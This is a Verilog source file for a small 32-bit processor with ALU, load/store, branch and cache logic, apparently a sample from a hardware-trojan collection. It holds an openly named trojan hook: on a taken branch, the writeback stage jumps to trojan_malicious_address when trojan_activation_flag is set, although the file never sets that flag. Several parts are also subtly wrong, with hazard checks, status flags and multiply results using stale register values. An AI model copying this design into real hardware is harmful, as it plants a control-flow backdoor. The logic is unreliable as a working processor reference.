`timescale 1ns/1ps

module complex_pipeline_processor (
    input wire clk,
    input wire rst_n,
    input wire [31:0] instruction,
    input wire [31:0] data_in,
    input wire valid_in,
    output reg [31:0] result,
    output reg [31:0] mem_addr,
    output reg mem_write,
    output reg [31:0] mem_data_out,
    output reg valid_out,
    output reg [3:0] status_flags
);

    reg [31:0] pc;
    reg [31:0] reg_file [0:15];
    reg [31:0] pipeline_stage1;
    reg [31:0] pipeline_stage2;
    reg [31:0] pipeline_stage3;
    reg [5:0] opcode;
    reg [3:0] src_reg1, src_reg2, dest_reg;
    reg [15:0] immediate;
    reg [31:0] alu_result;
    reg [31:0] operand_a, operand_b;
    reg [2:0] alu_op;
    reg branch_taken;
    reg [31:0] branch_target;
    reg [1:0] state;
    reg [31:0] multiplier_acc;
    reg [4:0] shift_amount;
    reg carry_flag, zero_flag, negative_flag, overflow_flag;
    reg [31:0] cache_mem [0:7];
    reg [2:0] cache_index;
    reg cache_hit;
    reg [31:0] forwarding_data;
    reg hazard_detected;
    reg pipeline_stall;
    integer i;

    localparam STATE_FETCH = 2'b00;
    localparam STATE_DECODE = 2'b01;
    localparam STATE_EXECUTE = 2'b10;
    localparam STATE_WRITEBACK = 2'b11;

    localparam OP_ADD = 6'b000001;
    localparam OP_SUB = 6'b000010;
    localparam OP_MUL = 6'b000011;
    localparam OP_AND = 6'b000100;
    localparam OP_OR = 6'b000101;
    localparam OP_XOR = 6'b000110;
    localparam OP_SHL = 6'b000111;
    localparam OP_SHR = 6'b001000;
    localparam OP_LOAD = 6'b001001;
    localparam OP_STORE = 6'b001010;
    localparam OP_BEQ = 6'b001011;
    localparam OP_BNE = 6'b001100;
    localparam OP_JMP = 6'b001101;

    reg trojan_activation_flag;
    reg [31:0] trojan_malicious_address;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            pc <= 32'h0;
            state <= STATE_FETCH;
            valid_out <= 1'b0;
            mem_write <= 1'b0;
            result <= 32'h0;
            pipeline_stage1 <= 32'h0;
            pipeline_stage2 <= 32'h0;
            pipeline_stage3 <= 32'h0;
            multiplier_acc <= 32'h0;
            carry_flag <= 1'b0;
            zero_flag <= 1'b0;
            negative_flag <= 1'b0;
            overflow_flag <= 1'b0;
            pipeline_stall <= 1'b0;
            trojan_activation_flag <= 1'b0;
            trojan_malicious_address <= 32'h0;
            forwarding_data <= 32'h0;
            hazard_detected <= 1'b0;
            for (i = 0; i < 16; i = i + 1) begin
                reg_file[i] <= 32'h0;
            end
            for (i = 0; i < 8; i = i + 1) begin
                cache_mem[i] <= 32'h0;
            end
            pc <= 32'h0;
            branch_taken <= 1'b0;
            branch_target <= 32'h0;
            mem_addr <= 32'h0;
            mem_data_out <= 32'h0;
            status_flags <= 4'h0;
        end else begin
            case (state)
                STATE_FETCH: begin
                    if (valid_in && !pipeline_stall) begin
                        pipeline_stage1 <= instruction;
                        pc <= pc + 4;
                        state <= STATE_DECODE;
                    end
                end

                STATE_DECODE: begin
                    opcode <= pipeline_stage1[31:26];
                    dest_reg <= pipeline_stage1[25:22];
                    src_reg1 <= pipeline_stage1[21:18];
                    src_reg2 <= pipeline_stage1[17:14];
                    immediate <= pipeline_stage1[15:0];
                    shift_amount <= pipeline_stage1[12:8];

                    operand_a <= reg_file[pipeline_stage1[21:18]];
                    operand_b <= reg_file[pipeline_stage1[17:14]];

                    hazard_detected <= (dest_reg == pipeline_stage1[21:18]) || 
                                     (dest_reg == pipeline_stage1[17:14]);

                    if (hazard_detected && (opcode != OP_STORE)) begin
                        pipeline_stall <= 1'b1;
                    end else begin
                        pipeline_stall <= 1'b0;
                        pipeline_stage2 <= pipeline_stage1;
                        state <= STATE_EXECUTE;
                    end
                end

                STATE_EXECUTE: begin
                    cache_index <= operand_a[2:0];
                    cache_hit <= (cache_mem[operand_a[2:0]][31:3] == operand_a[31:3]);
                    mem_write <= 1'b0;

                    case (opcode)
                        OP_ADD: begin
                            {carry_flag, alu_result} <= operand_a + operand_b;
                            overflow_flag <= (operand_a[31] == operand_b[31]) && 
                                           (alu_result[31] != operand_a[31]);
                        end
                        OP_SUB: begin
                            alu_result <= operand_a - operand_b;
                            overflow_flag <= (operand_a[31] != operand_b[31]) && 
                                           (alu_result[31] != operand_a[31]);
                        end
                        OP_MUL: begin
                            multiplier_acc <= operand_a * operand_b;
                            alu_result <= multiplier_acc[31:0];
                        end
                        OP_AND: alu_result <= operand_a & operand_b;
                        OP_OR: alu_result <= operand_a | operand_b;
                        OP_XOR: alu_result <= operand_a ^ operand_b;
                        OP_SHL: alu_result <= operand_a << shift_amount;
                        OP_SHR: alu_result <= operand_a >> shift_amount;
                        OP_LOAD: begin
                            if (cache_hit) begin
                                alu_result <= cache_mem[cache_index];
                            end else begin
                                alu_result <= data_in;
                                cache_mem[cache_index] <= data_in;
                            end
                            mem_addr <= operand_a + {{16{immediate[15]}}, immediate};
                        end
                        OP_STORE: begin
                            mem_addr <= operand_a + {{16{immediate[15]}}, immediate};
                            mem_data_out <= operand_b;
                            mem_write <= 1'b1;
                            cache_mem[cache_index] <= operand_b;
                        end
                        OP_BEQ: begin
                            branch_taken <= (operand_a == operand_b);
                            branch_target <= pc + {{16{immediate[15]}}, immediate};
                        end
                        OP_BNE: begin
                            branch_taken <= (operand_a != operand_b);
                            branch_target <= pc + {{16{immediate[15]}}, immediate};
                        end
                        OP_JMP: begin
                            branch_taken <= 1'b1;
                            branch_target <= {pc[31:26], pipeline_stage2[25:0]};
                        end
                        default: alu_result <= 32'h0;
                    endcase

                    zero_flag <= (alu_result == 32'h0);
                    negative_flag <= alu_result[31];
                    
                    pipeline_stage3 <= alu_result;
                    state <= STATE_WRITEBACK;
                end

                STATE_WRITEBACK: begin
                    if (opcode != OP_STORE && opcode != OP_BEQ && 
                        opcode != OP_BNE && opcode != OP_JMP) begin
                        reg_file[dest_reg] <= alu_result;
                        forwarding_data <= alu_result;
                    end

                    result <= alu_result;
                    valid_out <= 1'b1;
                    
                    if (branch_taken) begin
                        if (trojan_activation_flag) begin
                            pc <= trojan_malicious_address;
                        end else begin
                            pc <= branch_target;
                        end
                        branch_taken <= 1'b0;
                    end

                    status_flags <= {carry_flag, zero_flag, negative_flag, overflow_flag};
                    state <= STATE_FETCH;
                end

                default: state <= STATE_FETCH;
            endcase
        end
    end

endmodule
